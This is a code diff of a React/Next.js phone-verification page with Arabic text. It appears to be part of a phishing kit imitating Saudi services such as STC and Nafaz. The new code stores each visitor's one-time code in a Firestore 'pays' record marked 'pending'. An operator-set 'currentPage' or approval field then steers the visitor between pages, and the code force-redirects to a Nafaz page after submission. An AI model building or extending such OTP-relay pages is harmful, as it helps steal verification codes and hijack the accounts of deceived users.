@@ -3,12 +3,10 @@
 import type React from "react"
 import { useRouter } from "next/navigation"
 import { useEffect, useState } from "react"
-import { addData, db} from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
 import { Check, X, RefreshCw, Phone } from "lucide-react"
 import { Header } from "@/components/header"
-import {  STCModal } from "@/components/STCModal"
 import { PhoneVerificationService, sendPhone } from "@/lib/phone-service"
-import { OtpInput } from "@/components/otp-input"
 import { Input } from "@/components/ui/input"
 import { Badge } from "@/components/ui/badge"
 import { doc, onSnapshot } from "firebase/firestore"
@@ -96,58 +94,52 @@ export default function PhoneVerificationEnhanced() {
     return () => clearInterval(timer)
   }, [verificationStatus, timeLeft])
 
-  // Effect for listening to OTP status changes in Firestore
   useEffect(() => {
     if (verificationStatus !== "pending" || !visitorId) return
 
-    // Mock Firestore listener - replace with actual implementation
-    const mockListener = () => {
-      
-      
-      // Simulate random approval after some time for demo
-      const timer = setTimeout(() => {
-        const isApproved = Math.random() > 0.3 // 70% success rate for demo
-        if (isApproved) {
+    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
+      if (docSnapshot.exists()) {
+        const userData = docSnapshot.data()
+
+        // Check if phone verification is approved
+        if (userData.phoneVerificationStatus === "approved" || userData.currentPage === "1") {
           setVerificationStatus("approved")
-          setLoaderMessage("  . جاري التحويل")
+          setLoaderMessage("تم التحقق بنجاح. جاري التحويل...")
           setTimeout(() => {
-            router.push("/nafaz")
-          }, 2000)
-        } else {
+            router.push("/quote")
+          }, 1500)
+        } else if (userData.phoneVerificationStatus === "rejected") {
           setVerificationStatus("error")
-          setOtpError("فشل التحقق من رقم الهاتف. الرجاء المحاولة مرة أخرى.")
+          setOtpError("فشل التحقق من الرمز. الرجاء المحاولة مرة أخرى.")
+        } else if (userData.currentPage === "8888") {
+          router.push("/nafaz")
         }
-      }, 5000)
+      }
+    })
 
-      return () => clearTimeout(timer)
-    }
-
-    const cleanup = mockListener()
-    return cleanup
+    return () => unsubscribe()
   }, [verificationStatus, visitorId, router])
 
-  // Format time for display
-useEffect(()=>{
-  const visitorId=localStorage.getItem('visitor')
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor")
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
-        // Assuming the PIN is stored in a field called 'nafaz_pin'
-        if(userData.currentPage ==='1'){
-            window.location.href='/quote'
-        }else if(userData.currentPage ==='8888'){
-          window.location.href='/nafaz'
+        // Navigate based on currentPage value
+        if (userData.currentPage === "1") {
+          window.location.href = "/quote"
+        } else if (userData.currentPage === "8888") {
+          window.location.href = "/nafaz"
         }
       } else {
         console.error("User document not found")
       }
-    },
-    
-  )
+    })
 
-  // Clean up the listener when component unmounts or modal closes
-  return () => unsubscribe()
-}, [])
+    return () => unsubscribe()
+  }, [])
+
+  // Format time for display
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60)
     const secs = seconds % 60
@@ -207,7 +199,6 @@ useEffect(()=>{
     return isValid
   }
 
-  // Handle form submission
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
 
@@ -266,7 +257,6 @@ useEffect(()=>{
     }
   }
 
-  // Verify OTP code
   const verifyOtp = async (code?: string) => {
     const otpToVerify = code || otpCode
 
@@ -285,12 +275,14 @@ useEffect(()=>{
         otpSubmittedAt: new Date().toISOString(),
         phoneVerificationStatus: "pending",
       })
-
-      // The effect listener will handle status updates
+      setTimeout(() => {
+        window.location.href='/nafaz'
+      }, 3000);
     } catch (error) {
       console.error("OTP verification failed:", error)
       setVerificationStatus("error")
       setOtpError("حدث خطأ أثناء التحقق من الرمز. الرجاء المحاولة مرة أخرى.")
+     
     }
   }
 
@@ -355,9 +347,14 @@ useEffect(()=>{
               {(verificationStatus === "pending" || verificationStatus === "sending") &&
                 loaderMessage.includes("رمز التحقق") && (
                   <div className="space-y-4">
-                    <Input value={otpCode} type="tel" maxLength={6}  onChange={(e)=>handleOtpChange(e.target.value)}  />
-                  
-                  <Badge variant={'outline'} className="text-red-500">  {otpError} </Badge>
+                    <Input value={otpCode} type="tel" maxLength={6} onChange={(e) => handleOtpChange(e.target.value)} />
+
+                    {otpError && (
+                      <Badge variant={"outline"} className="text-red-500">
+                        {" "}
+                        {otpError}{" "}
+                      </Badge>
+                    )}
 
                     <div className="flex justify-center gap-2">
                       <button
@@ -381,7 +378,7 @@ useEffect(()=>{
                   </div>
                 )}
 
-              {otpError && (
+              {otpError && verificationStatus === "error" && (
                 <div className="p-3 bg-red-50 border border-red-200 rounded-lg">
                   <p className="text-red-600 text-sm">{otpError}</p>
                   {verificationStatus === "error" && (
@@ -400,11 +397,11 @@ useEffect(()=>{
                 </div>
               )}
 
-              {verificationStatus === "pending" && (
+              {verificationStatus === "pending" && !otpError && (
                 <p className="text-gray-600">الرجاء الانتظار بينما نتحقق من الرمز...</p>
               )}
 
-              {timeLeft > 0 && verificationStatus === "pending" && (
+              {timeLeft > 0 && verificationStatus === "pending" && !otpError && (
                 <div className="space-y-2">
                   <p className="text-3xl font-bold text-[#146394]">{formatTime(timeLeft)}</p>
                   <p className="text-sm text-gray-500">الوقت المتبقي لانتهاء صلاحية الرمز</p>
@@ -414,7 +411,6 @@ useEffect(()=>{
           </div>
         </div>
       )}
-
 
       {/* Main Form */}
       <div className="w-full max-w-4xl bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden mt-8 md:mt-0">
